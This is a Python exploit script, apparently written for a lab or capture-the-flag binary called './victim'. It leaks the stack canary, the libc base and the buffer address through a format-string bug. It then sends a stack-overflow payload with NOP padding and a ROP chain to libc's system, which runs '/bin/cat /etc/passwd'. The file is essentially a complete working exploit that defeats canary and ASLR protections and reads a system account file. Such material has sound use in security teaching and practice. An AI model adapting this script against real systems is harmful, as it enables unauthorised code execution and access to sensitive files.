import subprocess
import struct

shellcode = "/bin/cat /etc/passwd\0";

args = ["./victim"]

popen = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

fdo = popen.stdout
fdi = popen.stdin

print fdo.read(6)
fdi.write("%llx-" * 80 + "\n")

op = fdo.readline()
print op

oarr = op.split('-')

canary = int(oarr[70], 16)		# 0x65a91a774486a800 # 71th value
libcbase = int(oarr[68], 16) - 458173	# 0x7ffff7dd3790 - 0x3c6790 # 2nd value
bufaddr = int(oarr[73], 16) - 0x518	# 0x7ffff7dd3780 - 0x510 # 64th value

ebp = bufaddr + 0x430			# we will overwrite the %rbp value on the stack as well
mprotect = libcbase + 0x101770		# mprotect offset in libc
system = libcbase + 0x45390		# system offset in libc
gadget1 = libcbase + 135427 - 1		# pop %rdi; ret;
gadget2 = libcbase + 131817 - 1		# pop %rsi; ret;
gadget3 = libcbase + 7059 - 1		# pop %rdx; ret;

aligned_bufaddr = bufaddr & 0xfffffffffffff000; # align to page boundary
size = 4096					# page size
prot = 0x1|0x2|0x4;				# RWX

padding = "\x90" * (1032-len(shellcode))	# nop padding of remaining buf

print hex(system)

payload = shellcode + padding + \
   struct.pack('Q', canary) + \
   struct.pack('Q', ebp) + \
   struct.pack('Q', gadget1) + \
   struct.pack('Q', bufaddr) + \
   struct.pack('Q', system)

print " -- Sending Payload -- "
popen.stdin.write(payload)
(o, e) = popen.communicate()
print(o, e)

popen.wait()
